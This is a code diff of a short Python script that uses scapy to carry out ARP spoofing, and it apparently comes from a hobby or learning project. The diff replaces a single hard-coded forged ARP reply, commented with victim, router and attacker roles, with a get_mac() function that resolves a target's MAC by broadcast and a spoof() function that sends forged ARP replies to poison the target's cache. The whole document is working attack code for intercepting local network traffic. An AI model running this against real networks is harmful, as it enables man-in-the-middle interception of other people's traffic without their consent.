@@ -1,6 +1,15 @@
 import scapy.all as scapy
 
-packet = scapy.ARP(op=2, pdst="10.0.0.0", hwdst="00:00:00:00:00:00", psrc="10.10.0.1") #hwdst is attackers mac, pdst is victims ip and psrc is routers ip
-#print(packet.show()) and print(packet.summary()) provide detail about the packet
-scapy.send(packet) 
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #returns list with answered and unanswered ip's 
+    return answered_list[0][1].hwsrc
+    
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) 
+    scapy.send(packet)
 
